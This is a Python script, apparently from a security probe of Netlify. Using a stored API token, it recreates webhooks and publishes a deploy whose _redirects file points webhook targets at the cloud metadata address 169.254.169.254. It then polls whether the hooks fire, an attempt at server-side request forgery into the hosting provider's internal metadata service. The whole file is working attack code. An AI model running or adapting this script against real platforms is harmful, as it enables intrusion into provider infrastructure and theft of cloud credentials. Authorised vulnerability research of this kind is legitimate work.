# -*- coding: utf-8 -*-
# _hk_trigger2.py - recreate hooks WITH event, trigger deploy, poll success
import sys, os, json, time, hashlib, urllib.request, urllib.error

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _net_creds import TOKEN_B

SITE_B = "d2977de0-d24d-4544-81cb-933e610cad7d"
API = "https://api.netlify.com/api/v1"

def req(method, url, tok=None, body=None, raw_body=None, ctype=None, timeout=40):
    r = urllib.request.Request(url, method=method)
    if tok:
        r.add_header("Authorization", "Bearer " + tok)
    data = None
    if raw_body is not None:
        data = raw_body
        r.add_header("Content-Type", ctype or "application/octet-stream")
    elif body is not None:
        data = json.dumps(body).encode()
        r.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(r, data=data, timeout=timeout) as resp:
            b = resp.read(40000)
            try:
                return resp.status, json.loads(b.decode("utf-8", "replace"))
            except Exception:
                return resp.status, b[:1000]
    except urllib.error.HTTPError as e:
        b = e.read(4000)
        try:
            return e.code, json.loads(b.decode("utf-8", "replace"))
        except Exception:
            return e.code, b[:400]
    except Exception as ex:
        return -1, str(ex)[:300]

# delete old hooks
ids = json.load(open(r"D:\scan\netlify_report\_hk_ids.txt"))
for name in ("meta", "ctl"):
    if ids.get(name):
        s, _ = req("DELETE", API + "/hooks/%s" % ids[name], tok=TOKEN_B)
        print("delete old hook", name, s)

# create hooks WITH event
SITE_B_DOMAIN = "sec-b-08v4pk.netlify.app"
new_ids = {}
for name, target in (("meta", "https://%s/hookmeta/x" % SITE_B_DOMAIN),
                     ("ctl", "https://%s/hookctl/x" % SITE_B_DOMAIN)):
    body = {"type": "url", "event": "deploy_created", "data": {"url": target}}
    s, h = req("POST", API + "/hooks?site_id=%s" % SITE_B, tok=TOKEN_B, body=body)
    print("create %s w/event:" % name, s, json.dumps(h, ensure_ascii=False)[:300] if isinstance(h, (dict, list)) else repr(h)[:200])
    if isinstance(h, dict) and h.get("id"):
        new_ids[name] = h["id"]
print("new ids:", new_ids)
open(r"D:\scan\netlify_report\_hk_ids2.txt", "w").write(json.dumps(new_ids))

# trigger deploy
html3 = b"<html><body>hooktest-trigger-3</body></html>"
redir3 = b"/hookmeta/*  https://169.254.169.254/latest/meta-data/  302\n/hookctl/*  /index.html  302\n"
files = {"/index.html": hashlib.sha1(html3).hexdigest(),
         "/_redirects": hashlib.sha1(redir3).hexdigest()}
s, d = req("POST", API + "/sites/%s/deploys" % SITE_B, tok=TOKEN_B,
           body={"title": "hook-trigger-3", "files": files})
print("deploy3 create:", s, (d.get("id"), d.get("state")) if isinstance(d, dict) else repr(d)[:200])
DID3 = d.get("id") if isinstance(d, dict) else None
if DID3:
    for path, content in (("/index.html", html3), ("/_redirects", redir3)):
        req("PUT", API + "/deploys/%s/files%s" % (DID3, path), tok=TOKEN_B,
            raw_body=content, ctype="application/octet-stream")
    s, dd = req("PUT", API + "/sites/%s/deploys/%s" % (SITE_B, DID3), tok=TOKEN_B, body={"state": "published"})
    print("publish3:", s, dd.get("state") if isinstance(dd, dict) else repr(dd)[:200])

# poll
for i in range(10):
    time.sleep(5)
    out = []
    for name, hid in new_ids.items():
        s, h = req("GET", API + "/hooks/%s" % hid, tok=TOKEN_B)
        if isinstance(h, dict):
            out.append("%s: success=%r disabled=%r" % (name, h.get("success"), h.get("disabled")))
        else:
            out.append("%s: %s %r" % (name, s, h))
    print("poll %d: %s" % (i, " | ".join(out)), flush=True)
    done = True
    for name, hid in new_ids.items():
        s, h = req("GET", API + "/hooks/%s" % hid, tok=TOKEN_B)
        if isinstance(h, dict) and h.get("success") is None:
            done = False
    if done:
        break
